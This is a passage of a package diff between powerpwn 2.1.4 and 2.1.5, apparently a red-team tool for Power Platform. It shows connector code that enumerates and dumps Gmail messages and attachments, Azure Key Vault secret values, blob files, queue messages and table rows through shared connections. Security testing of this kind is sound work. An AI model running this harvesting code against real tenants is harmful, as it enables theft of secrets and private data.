+                                                extra={k: v for k, v in get_email_val.items() if k not in {"Body", "Attachments"}},
+                                            )
+                                        )
+
+                                        for attachment_obj in get_email_val["Attachments"]:
+                                            data_records.append(
+                                                DataRecord(
+                                                    record_type=DataDumpType.attachment,
+                                                    record_id=get_email_val["Id"],
+                                                    record_name=attachment_obj["Name"],
+                                                    extra={k: v for k, v in attachment_obj.items() if k not in {"ContentBytes"}},
+                                                )
+                                            )
+
+                                        # avoid processing the same email twice
+                                        unique_email_ids_seen.add(get_email_val["Id"])
+
+                                    # Ignore identical subjects to continue iteration
+                                    params["subject"] += f" -{get_email_val['Subject']}"
+
+        return data_records
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        if data_record.data_record.record_type == DataDumpType.email:
+            success, _, get_email_val = request_and_verify(
+                session=self._session,
+                expected_status_prefix="200",
+                method="get",
+                url=f"{self._root}/Mail/{data_record.data_record.record_id}",
+                params={"includeAttachments": False},
+            )
+            if success:
+                extension = "html" if data_record.data_record.extra.get("IsHtml", False) else "txt"
+                encoding = ENCODING
+                content = get_email_val["Body"].encode(ENCODING)
+
+        elif data_record.data_record.record_type == DataDumpType.attachment:
+            success, _, get_email_val = request_and_verify(
+                session=self._session,
+                expected_status_prefix="200",
+                method="get",
+                url=f"{self._root}/Mail/{data_record.data_record.record_id}",
+                params={"includeAttachments": True},
+            )
+
+            if success:
+                for attachment_obj in get_email_val["Attachments"]:
+                    if attachment_obj["Name"] == data_record.data_record.record_name:
+                        extension = attachment_obj["ContentType"].partition('name="')[2].partition(".")[-1].replace('"', "")
+                        encoding = None
+                        content = attachment_obj["ContentBytes"]
+
+                        # We are looking for a specific attachment
+                        break
+                else:
+                    # Couldn't find relevant attachment
+                    success = False
+        else:
+            raise ValueError(f"Unsupported data type: {data_record.data_record.record_type}.")
+
+        if not success:
+            raise ValueError(
+                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
+            )
+
+        data_dump = DataDump(extension=extension, encoding=encoding, content=content)
+        return data_dump
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_gmail"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "gmail"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py`

 * *Ordering differences only*

 * *Files 15% similar despite different names*

```diff
@@ -1,86 +1,86 @@
-from typing import List
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
-
-
-class KeyVaultConnector(ConnectorBase):
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        data_stores: List[DataStore] = []
-
-        can_list_keys, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/keys")
-        can_list_secrets, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/secrets")
-
-        if can_list_keys or can_list_secrets:
-            if (account := connection_parameters.get("accountName")) is not None:
-                pass
-            elif (account := connection_parameters.get("token:clientId")) is not None:
-                pass
-            else:
-                raise ValueError(f"Couldn't find expected connection parameters. Got: {connection_parameters.keys()}.")
-
-            data_stores.append(
-                DataStore(
-                    tenant=connection_parameters.get("token:TenantId"),
-                    account=account,
-                    scope=None,
-                    host=f"https://{connection_parameters['vaultName'].strip(' ')}.vault.azure.net/",
-                    name=connection_parameters["vaultName"],
-                    extra={},
-                )
-            )
-
-        return data_stores
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        data_records: List[DataRecord] = []
-
-        can_list_keys, keys_val = consecutive_gets(session=self._session, expected_status_prefix="200", url=f"{self._root}/keys")
-        if can_list_keys:
-            for key_obj in keys_val:
-                data_records.append(DataRecord(record_type=DataDumpType.key, record_id=key_obj["name"], record_name=key_obj["name"], extra=key_obj))
-
-        can_list_secrets, secrets_val = consecutive_gets(session=self._session, expected_status_prefix="200", url=f"{self._root}/secrets")
-        if can_list_secrets:
-            for secret_obj in secrets_val:
-                data_records.append(
-                    DataRecord(record_type=DataDumpType.secret, record_id=secret_obj["name"], record_name=secret_obj["name"], extra=secret_obj)
-                )
-
-        return data_records
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        if data_record.data_record.record_type == DataDumpType.key:
-            raise NotImplementedError("Dumping key value has not been implemented.")
-        elif data_record.data_record.record_type == DataDumpType.secret:
-            success, _, val = request_and_verify(
-                session=self._session,
-                expected_status_prefix="200",
-                method="get",
-                url=f"{self._root}/secrets/{data_record.data_record.record_id}/value",
-            )
-        else:
-            raise ValueError(f"Unsupported data type: {data_record.data_record.record_type}.")
-
-        if not success:
-            raise ValueError(
-                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
-            )
-
-        secret_value: str = val["value"]
-
-        data_dump = DataDump(extension="txt", encoding=ENCODING, content=secret_value.encode(ENCODING))
-        return data_dump
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_keyvault"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "keyvault"
+from typing import List
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
+
+
+class KeyVaultConnector(ConnectorBase):
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        data_stores: List[DataStore] = []
+
+        can_list_keys, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/keys")
+        can_list_secrets, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/secrets")
+
+        if can_list_keys or can_list_secrets:
+            if (account := connection_parameters.get("accountName")) is not None:
+                pass
+            elif (account := connection_parameters.get("token:clientId")) is not None:
+                pass
+            else:
+                raise ValueError(f"Couldn't find expected connection parameters. Got: {connection_parameters.keys()}.")
+
+            data_stores.append(
+                DataStore(
+                    tenant=connection_parameters.get("token:TenantId"),
+                    account=account,
+                    scope=None,
+                    host=f"https://{connection_parameters['vaultName'].strip(' ')}.vault.azure.net/",
+                    name=connection_parameters["vaultName"],
+                    extra={},
+                )
+            )
+
+        return data_stores
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        data_records: List[DataRecord] = []
+
+        can_list_keys, keys_val = consecutive_gets(session=self._session, expected_status_prefix="200", url=f"{self._root}/keys")
+        if can_list_keys:
+            for key_obj in keys_val:
+                data_records.append(DataRecord(record_type=DataDumpType.key, record_id=key_obj["name"], record_name=key_obj["name"], extra=key_obj))
+
+        can_list_secrets, secrets_val = consecutive_gets(session=self._session, expected_status_prefix="200", url=f"{self._root}/secrets")
+        if can_list_secrets:
+            for secret_obj in secrets_val:
+                data_records.append(
+                    DataRecord(record_type=DataDumpType.secret, record_id=secret_obj["name"], record_name=secret_obj["name"], extra=secret_obj)
+                )
+
+        return data_records
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        if data_record.data_record.record_type == DataDumpType.key:
+            raise NotImplementedError("Dumping key value has not been implemented.")
+        elif data_record.data_record.record_type == DataDumpType.secret:
+            success, _, val = request_and_verify(
+                session=self._session,
+                expected_status_prefix="200",
+                method="get",
+                url=f"{self._root}/secrets/{data_record.data_record.record_id}/value",
+            )
+        else:
+            raise ValueError(f"Unsupported data type: {data_record.data_record.record_type}.")
+
+        if not success:
+            raise ValueError(
+                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
+            )
+
+        secret_value: str = val["value"]
+
+        data_dump = DataDump(extension="txt", encoding=ENCODING, content=secret_value.encode(ENCODING))
+        return data_dump
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_keyvault"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "keyvault"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,120 +1,120 @@
-import urllib.parse
-from typing import Any, Dict, Generator, List
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
-
-
-class SharedAzureBlobConnector(ConnectorBase):
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        data_stores: List[DataStore] = []
-
-        # we dont have server/database for another auth types
-        if connection_parameters.get("name", "") != "keyBasedAuth":
-            return data_stores
-
-        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
-
-        storage_account_name = connection_parameters["values"]["accountName"]["value"]
-
-        # if connection is connected with blob endpoint and not storage account
-        if storage_account_name.startswith("https://"):
-            storage_account_name = "AccountNameFromSettings"  # a hack # connection_parameters["values"]["accountName"]["value"].split(".blob.core.windows.net")[0].partition("https://")[2]
-
-        if success:
-            # TODO: with blob storage endpoint, we are getting Storage account name provided in the authentication 'https://exportdatasa.blob.core.windows.net' doesn't match with storage account name provided in the operation parameter
-            can_list_root_folders, root_folders_val = consecutive_gets(
-                session=self._session,
-                expected_status_prefix="200",
-                property_for_pagination="nextLink",
-                url=f"{self._root}/v2/datasets/{storage_account_name}/foldersV2",
-            )
-            if can_list_root_folders:
-                for root_folder in root_folders_val:
-                    data_stores.append(
-                        DataStore(
-                            tenant=None,
-                            scope=None,
-                            account=storage_account_name,
-                            name=root_folder["DisplayName"],
-                            host=f'https://{storage_account_name}.blob.core.windows.net/{root_folder["Name"]}',
-                            extra={"storage_account_name": storage_account_name, "blob_id": root_folder["Id"]},
-                        )
-                    )
-
-        return data_stores
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        data_records: List[DataRecord] = []
-        folder_obj = {"Id": data_store.data_store.extra["blob_id"], "IsFolder": True}
-        files = self.__enumerate_folders_content_recursively(data_store.data_store.extra["storage_account_name"], folder_obj)
-        for file_obj in files:
-            data_records.append(
-                DataRecord(
-                    record_type=DataDumpType.file,
-                    record_id=file_obj["Id"],
-                    record_name=file_obj["Name"],
-                    extra={"file_path": file_obj["Path"], "media_type": file_obj["MediaType"]},
-                )
-            )
-
-        return data_records
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        file_id = urllib.parse.quote(data_record.data_record.record_id)
-
-        success, _, val = request_and_verify(
-            session=self._session,
-            expected_status_prefix="200",
-            is_json_resp=False,
-            method="get",
-            url=f"{self._root}/v2/datasets/{data_record.data_store.data_store.extra['storage_account_name']}/files/{file_id}/content",
-        )
-
-        if not success:
-            raise ValueError(
-                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
-            )
-
-        document_value = val.encode(ENCODING)
-
-        # add check for mypy
-        if file_name := data_record.data_record.record_name:
-            extension = file_name.split(".")[-1]
-
-            last_index_for_extension = file_name.rindex(".")
-            data_record.data_record.record_name = file_name[:last_index_for_extension]
-
-        data_dump = DataDump(extension=extension, encoding=ENCODING, content=document_value)
-        return data_dump
-
-    def __enumerate_folders_content_recursively(self, storage_account: str, root_folder: Dict[str, str]) -> Generator[Dict[str, Any], None, None]:
-        stack = [root_folder]
-        while len(stack) > 0:
-            current_folder_obj = stack.pop()
-            if not current_folder_obj["IsFolder"]:
-                yield current_folder_obj
-            else:
-                current_folder_obj_id = current_folder_obj["Id"]
-                # TODO: use right pagination method with nextLink
-                is_success, sub_folders = consecutive_gets(
-                    session=self._session,
-                    expected_status_prefix="200",
-                    property_for_pagination="nextLink",
-                    url=f"{self._root}/v2/datasets/{storage_account}/foldersV2/{current_folder_obj_id}",
-                )
-                if is_success and len(sub_folders) > 0:
-                    stack.extend(sub_folders)
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_azureblob"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "azureblob"
+import urllib.parse
+from typing import Any, Dict, Generator, List
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
+
+
+class SharedAzureBlobConnector(ConnectorBase):
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        data_stores: List[DataStore] = []
+
+        # we dont have server/database for another auth types
+        if connection_parameters.get("name", "") != "keyBasedAuth":
+            return data_stores
+
+        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
+
+        storage_account_name = connection_parameters["values"]["accountName"]["value"]
+
+        # if connection is connected with blob endpoint and not storage account
+        if storage_account_name.startswith("https://"):
+            storage_account_name = "AccountNameFromSettings"  # a hack # connection_parameters["values"]["accountName"]["value"].split(".blob.core.windows.net")[0].partition("https://")[2]
+
+        if success:
+            # TODO: with blob storage endpoint, we are getting Storage account name provided in the authentication 'https://exportdatasa.blob.core.windows.net' doesn't match with storage account name provided in the operation parameter
+            can_list_root_folders, root_folders_val = consecutive_gets(
+                session=self._session,
+                expected_status_prefix="200",
+                property_for_pagination="nextLink",
+                url=f"{self._root}/v2/datasets/{storage_account_name}/foldersV2",
+            )
+            if can_list_root_folders:
+                for root_folder in root_folders_val:
+                    data_stores.append(
+                        DataStore(
+                            tenant=None,
+                            scope=None,
+                            account=storage_account_name,
+                            name=root_folder["DisplayName"],
+                            host=f'https://{storage_account_name}.blob.core.windows.net/{root_folder["Name"]}',
+                            extra={"storage_account_name": storage_account_name, "blob_id": root_folder["Id"]},
+                        )
+                    )
+
+        return data_stores
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        data_records: List[DataRecord] = []
+        folder_obj = {"Id": data_store.data_store.extra["blob_id"], "IsFolder": True}
+        files = self.__enumerate_folders_content_recursively(data_store.data_store.extra["storage_account_name"], folder_obj)
+        for file_obj in files:
+            data_records.append(
+                DataRecord(
+                    record_type=DataDumpType.file,
+                    record_id=file_obj["Id"],
+                    record_name=file_obj["Name"],
+                    extra={"file_path": file_obj["Path"], "media_type": file_obj["MediaType"]},
+                )
+            )
+
+        return data_records
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        file_id = urllib.parse.quote(data_record.data_record.record_id)
+
+        success, _, val = request_and_verify(
+            session=self._session,
+            expected_status_prefix="200",
+            is_json_resp=False,
+            method="get",
+            url=f"{self._root}/v2/datasets/{data_record.data_store.data_store.extra['storage_account_name']}/files/{file_id}/content",
+        )
+
+        if not success:
+            raise ValueError(
+                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
+            )
+
+        document_value = val.encode(ENCODING)
+
+        # add check for mypy
+        if file_name := data_record.data_record.record_name:
+            extension = file_name.split(".")[-1]
+
+            last_index_for_extension = file_name.rindex(".")
+            data_record.data_record.record_name = file_name[:last_index_for_extension]
+
+        data_dump = DataDump(extension=extension, encoding=ENCODING, content=document_value)
+        return data_dump
+
+    def __enumerate_folders_content_recursively(self, storage_account: str, root_folder: Dict[str, str]) -> Generator[Dict[str, Any], None, None]:
+        stack = [root_folder]
+        while len(stack) > 0:
+            current_folder_obj = stack.pop()
+            if not current_folder_obj["IsFolder"]:
+                yield current_folder_obj
+            else:
+                current_folder_obj_id = current_folder_obj["Id"]
+                # TODO: use right pagination method with nextLink
+                is_success, sub_folders = consecutive_gets(
+                    session=self._session,
+                    expected_status_prefix="200",
+                    property_for_pagination="nextLink",
+                    url=f"{self._root}/v2/datasets/{storage_account}/foldersV2/{current_folder_obj_id}",
+                )
+                if is_success and len(sub_folders) > 0:
+                    stack.extend(sub_folders)
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_azureblob"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "azureblob"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,83 +1,82 @@
-import json
-from typing import List
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-from powerpwn.powerdump.utils.requests_wrapper import request_and_verify
-
-
-class SharedAzureQueuesConnector(ConnectorBase):
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        data_stores: List[DataStore] = []
-
-        # we dont have server/database for another auth types
-        if connection_parameters.get("name", "") != "keyBasedAuth":
-            return data_stores
-
-        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
-
-        storage_account_name = connection_parameters["values"]["storageaccount"]["value"]
-
-        # if connection is connected with blob endpoint and not storage account
-        if storage_account_name.startswith("https://"):
-            storage_account_name = "AccountNameFromSettings"  # a hack # connection_parameters["values"]["accountName"]["value"].split(".blob.core.windows.net")[0].partition("https://")[2]
-
-        if success:
-            can_list_root_queues, _, queues_val = request_and_verify(
-                session=self._session,
-                expected_status_prefix="200",
-                method="get",
-                url=f"{self._root}/v2/storageAccounts/{storage_account_name}/queues/list",
-            )
-            if can_list_root_queues:
-                for queue in queues_val:
-                    data_stores.append(
-                        DataStore(
-                            tenant=None,
-                            scope=None,
-                            account=storage_account_name,
-                            name=queue["Name"],
-                            host=f'https://{storage_account_name}.queue.core.windows.net/{queue["Name"]}',
-                            extra={},
-                        )
-                    )
-
-        return data_stores
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        return [
-            DataRecord(record_type=DataDumpType.queue_message, record_id=data_store.data_store.name, record_name=data_store.data_store.name, extra={})
-        ]
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        queue_name = data_record.data_record.record_id
-
-        success, _, val = request_and_verify(
-            session=self._session,
-            expected_status_prefix="200",
-            method="get",
-            url=f"{self._root}/v2/storageAccounts/{data_record.data_store.data_store.account}/queues/{queue_name}/messages?numofmessages=10",
-        )
-
-        if not success:
-            raise ValueError(
-                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
-            )
-
-        messages = val["QueueMessagesList"]["QueueMessage"]
-        document_value = json.dumps(messages).encode(ENCODING)
-
-        data_dump = DataDump(extension="json", encoding=ENCODING, content=document_value)
-        return data_dump
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_azurequeues"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "azurequeues"
+import json
+from typing import List
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
+
+
+class SharedAzureTablesConnector(ConnectorBase):
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        data_stores: List[DataStore] = []
+
+        # we dont have server/database for another auth types
+        # TODO: create connection with table endpoint instead of account name
+        if connection_parameters.get("name", "") != "keyBasedAuth":
+            return data_stores
+
+        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
+
+        storage_account_name = connection_parameters["values"]["storageaccount"]["value"]
+
+        # if connection is connected with table endpoint and not storage account
+        if storage_account_name.startswith("https://"):
+            storage_account_name = "AccountNameFromSettings"  # a hack #connection_parameters["values"]["storageaccount"]["value"].split(".table.core.windows.net")[0].partition("https://")[2]
+
+        if success:
+            # TODO: with blob storage endpoint, we are getting Storage account name provided in the authentication 'https://exportdatasa.blob.core.windows.net' doesn't match with storage account name provided in the operation parameter
+            data_stores.append(
+                DataStore(
+                    tenant=None,
+                    account=storage_account_name,
+                    scope=None,
+                    host=f"https://{storage_account_name}.table.core.windows.net",
+                    name=storage_account_name,
+                    extra={},
+                )
+            )
+
+        return data_stores
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        data_records: List[DataRecord] = []
+
+        can_list_tables, tables_val = consecutive_gets(
+            session=self._session, expected_status_prefix="200", url=f"{self._root}/v2/storageAccounts/{data_store.data_store.name}/tables"
+        )
+        if can_list_tables:
+            for table_obj in tables_val:
+                table_name = table_obj["TableName"]
+                data_records.append(DataRecord(record_type=DataDumpType.table, record_id=table_name, record_name=table_name, extra={}))
+
+        return data_records
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        table_name = data_record.data_record.record_id
+        success, val = consecutive_gets(
+            session=self._session,
+            expected_status_prefix="200",
+            url=f"{self._root}/v2/storageAccounts/{data_record.data_store.data_store.name}/tables/{table_name}/entities",
+        )
+
+        if not success:
+            raise ValueError(
+                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
+            )
+
+        document_value = json.dumps(val).encode(ENCODING)
+
+        data_dump = DataDump(extension="json", encoding=ENCODING, content=document_value)
+        return data_dump
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_azuretables"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "azuretables"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,82 +1,83 @@
-import json
-from typing import List
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
-
-
-class SharedAzureTablesConnector(ConnectorBase):
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        data_stores: List[DataStore] = []
-
-        # we dont have server/database for another auth types
-        # TODO: create connection with table endpoint instead of account name
-        if connection_parameters.get("name", "") != "keyBasedAuth":
-            return data_stores
-
-        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
-
-        storage_account_name = connection_parameters["values"]["storageaccount"]["value"]
-
-        # if connection is connected with table endpoint and not storage account
-        if storage_account_name.startswith("https://"):
-            storage_account_name = "AccountNameFromSettings"  # a hack #connection_parameters["values"]["storageaccount"]["value"].split(".table.core.windows.net")[0].partition("https://")[2]
-
-        if success:
-            # TODO: with blob storage endpoint, we are getting Storage account name provided in the authentication 'https://exportdatasa.blob.core.windows.net' doesn't match with storage account name provided in the operation parameter
-            data_stores.append(
-                DataStore(
-                    tenant=None,
-                    account=storage_account_name,
-                    scope=None,
-                    host=f"https://{storage_account_name}.table.core.windows.net",
-                    name=storage_account_name,
-                    extra={},
-                )
-            )
-
-        return data_stores
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        data_records: List[DataRecord] = []
-
-        can_list_tables, tables_val = consecutive_gets(
-            session=self._session, expected_status_prefix="200", url=f"{self._root}/v2/storageAccounts/{data_store.data_store.name}/tables"
-        )
-        if can_list_tables:
-            for table_obj in tables_val:
-                table_name = table_obj["TableName"]
-                data_records.append(DataRecord(record_type=DataDumpType.table, record_id=table_name, record_name=table_name, extra={}))
-
-        return data_records
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        table_name = data_record.data_record.record_id
-        success, val = consecutive_gets(
-            session=self._session,
-            expected_status_prefix="200",
-            url=f"{self._root}/v2/storageAccounts/{data_record.data_store.data_store.name}/tables/{table_name}/entities",
-        )
-
-        if not success:
-            raise ValueError(
-                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
-            )
-
-        document_value = json.dumps(val).encode(ENCODING)
-
-        data_dump = DataDump(extension="json", encoding=ENCODING, content=document_value)
-        return data_dump
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_azuretables"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "azuretables"
+import json
+from typing import List
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+from powerpwn.powerdump.utils.requests_wrapper import request_and_verify
+
+
+class SharedAzureQueuesConnector(ConnectorBase):
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        data_stores: List[DataStore] = []
+
+        # we dont have server/database for another auth types
+        if connection_parameters.get("name", "") != "keyBasedAuth":
+            return data_stores
+
+        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
+
+        storage_account_name = connection_parameters["values"]["storageaccount"]["value"]
+
+        # if connection is connected with blob endpoint and not storage account
+        if storage_account_name.startswith("https://"):
+            storage_account_name = "AccountNameFromSettings"  # a hack # connection_parameters["values"]["accountName"]["value"].split(".blob.core.windows.net")[0].partition("https://")[2]
+
+        if success:
+            can_list_root_queues, _, queues_val = request_and_verify(
+                session=self._session,
+                expected_status_prefix="200",
+                method="get",
+                url=f"{self._root}/v2/storageAccounts/{storage_account_name}/queues/list",
+            )
+            if can_list_root_queues:
+                for queue in queues_val:
+                    data_stores.append(
+                        DataStore(
+                            tenant=None,
+                            scope=None,
+                            account=storage_account_name,
+                            name=queue["Name"],
+                            host=f'https://{storage_account_name}.queue.core.windows.net/{queue["Name"]}',
+                            extra={},
+                        )
+                    )
+
+        return data_stores
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        return [
+            DataRecord(record_type=DataDumpType.queue_message, record_id=data_store.data_store.name, record_name=data_store.data_store.name, extra={})
+        ]
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        queue_name = data_record.data_record.record_id
+
+        success, _, val = request_and_verify(
+            session=self._session,
+            expected_status_prefix="200",
+            method="get",
+            url=f"{self._root}/v2/storageAccounts/{data_record.data_store.data_store.account}/queues/{queue_name}/messages?numofmessages=10",
+        )
+
+        if not success:
+            raise ValueError(
+                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
+            )
+
+        messages = val["QueueMessagesList"]["QueueMessage"]
+        document_value = json.dumps(messages).encode(ENCODING)
+
+        data_dump = DataDump(extension="json", encoding=ENCODING, content=document_value)
+        return data_dump
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_azurequeues"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "azurequeues"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py`

 * *Files 19% similar despite different names*

```diff
@@ -1,97 +1,99 @@
-import json
-from typing import List
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
